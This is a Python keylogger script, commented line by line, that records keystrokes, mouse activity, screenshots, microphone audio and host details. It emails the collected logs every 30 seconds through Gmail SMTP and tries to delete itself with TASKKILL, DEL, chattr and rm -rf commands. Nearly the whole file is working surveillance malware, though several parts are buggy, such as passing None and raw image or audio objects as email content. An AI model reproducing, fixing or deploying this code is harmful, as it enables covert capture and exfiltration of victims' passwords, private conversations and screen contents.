try:
    import logging  # Allows the program to log events, like mouse movements or key presses, for debugging or tracking
    import os  # Lets the program interact with the operating system (files, directories, running commands)
    import platform  # Provides information about the computer’s system, like OS, processor, and machine type
    import smtplib  # Enables sending emails via SMTP (used to send logs or reports)
    import socket  # Allows network operations, like finding the computer’s IP address
    import threading  # Lets the program run multiple tasks at the same time (like taking screenshots while recording keys)
    import wave  # Handles audio files in WAV format (used for microphone recordings)
    import pyscreenshot  # Used to take screenshots of the computer screen
    import sounddevice as sd  # Captures audio from the microphone
    from pynput import keyboard  # Allows capturing keyboard events
    from pynput.keyboard import Listener  # Listens to individual key presses
    from email import encoders  # Helps encode attachments for email
    from email.mime.base import MIMEBase  # Creates base email attachment objects
    from email.mime.multipart import MIMEMultipart  # Allows creating emails with multiple parts (text + attachments)
    from email.mime.text import MIMEText  # Allows sending text content in emails
    import glob  # Finds files or paths on the computer using patterns (like all .txt files in a folder)

except ModuleNotFoundError:
    from subprocess import call
    modules = ["pyscreenshot","sounddevice","pynput"]
    call("pip install " + ' '.join(modules), shell=True)


finally:
    EMAIL_ADDRESS = "Enter your Email id here "
    EMAIL_PASSWORD = "enter your password here "

    SEND_REPORT_EVERY = 30# as in seconds
    class KeyLogger:
        def __init__(self, time_interval, email, password):
            self.interval = time_interval
            self.log = "Hey Boss, I am on your mission just wait 30 second to reveal the secreat...."
            self.email = email
            self.password = password

        def appendlog(self, string):
            self.log = self.log + string

        def on_move(self, x, y):
            current_move = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_move)

        def on_click(self, x, y):
            current_click = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_click)

        def on_scroll(self, x, y):
            current_scroll = logging.info("Mouse moved to {} {}".format(x, y))
            self.appendlog(current_scroll)

        def save_data(self, key):
            try:
                current_key = str(key.char)
            except AttributeError:
                if key == key.space:
                    current_key = "-->"
                elif key == key.esc:
                    current_key = ""
                else:
                    current_key = "" + str(key) + ""

            self.appendlog(current_key)

        def send_mail(self, email, password, message):
            sender = email
            receiver = email  # send to yourself safely
            m = f"""\
        Subject: Keylogger Test
        To: {receiver}
        From: {sender}

        {message}
        """
            # Gmail SMTP server
            with smtplib.SMTP("smtp.gmail.com", 587) as server:
                server.starttls()  # secure the connection
                server.login(email, password)  # use App Password here
                server.sendmail(sender, receiver, m)

        def report(self):
            self.send_mail(self.email, self.password, "\n\n" + self.log)
            self.log = ""
            timer = threading.Timer(self.interval, self.report)
            timer.start()

        def system_information(self):
            hostname = socket.gethostname()
            ip = socket.gethostbyname(hostname)
            plat = platform.processor()
            system = platform.system()
            machine = platform.machine()
            self.appendlog(hostname)
            self.appendlog(ip)
            self.appendlog(plat)
            self.appendlog(system)
            self.appendlog(machine)

        def microphone(self):
            fs = 44100
            seconds = SEND_REPORT_EVERY
            obj = wave.open('sound.wav', 'w')
            obj.setnchannels(1)  # mono
            obj.setsampwidth(2)
            obj.setframerate(fs)
            myrecording = sd.rec(int(seconds * fs), samplerate=fs, channels=2)
            obj.writeframesraw(myrecording)
            sd.wait()

            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=obj)

        def screenshot(self):
            img = pyscreenshot.grab()
            self.send_mail(email=EMAIL_ADDRESS, password=EMAIL_PASSWORD, message=img)

        def run(self):
            keyboard_listener = keyboard.Listener(on_press=self.save_data)
            with keyboard_listener:
                self.report()
                keyboard_listener.join()
            with Listener(on_click=self.on_click, on_move=self.on_move, on_scroll=self.on_scroll) as mouse_listener:
                mouse_listener.join()
            if os.name == "nt":
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd" + pwd)
                    os.system("TASKKILL /F /IM " + os.path.basename(__file__))
                    print('File was closed.')
                    os.system("DEL" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

            else:
                try:
                    pwd = os.path.abspath(os.getcwd())
                    os.system("cd " + pwd)
                    os.system('pkill leafpad')
                    os.system("chattr -i " +  os.path.basename(__file__))
                    print('File was closed.')
                    os.system("rm -rf" + os.path.basename(__file__))
                except OSError:
                    print('File is close.')

    keylogger = KeyLogger(SEND_REPORT_EVERY, EMAIL_ADDRESS, EMAIL_PASSWORD)
    keylogger.run()



